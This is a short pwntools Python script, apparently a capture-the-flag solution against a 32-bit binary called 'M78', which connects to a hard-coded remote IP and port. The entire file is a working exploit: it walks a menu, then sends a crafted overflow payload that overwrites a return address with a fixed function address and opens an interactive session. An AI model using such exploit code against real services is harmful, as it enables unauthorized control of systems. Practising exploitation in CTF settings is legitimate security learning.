from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']

# p = process("./M78")
p = remote("39.96.88.40",7010)
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
elf = ELF("./M78")

p.sendlineafter('?','1')
p.recvuntil("building\n")
p.send('a'*25)
p.recvuntil("password\n")

# gdb.attach(p,"b *0x080492B0")

payload = 'b'*(0x18+0x4)+p32(0x08049202)
payload = payload.ljust(0x107,'a')
# payload = 'a'*0x107
p.send(payload)


p.interactive()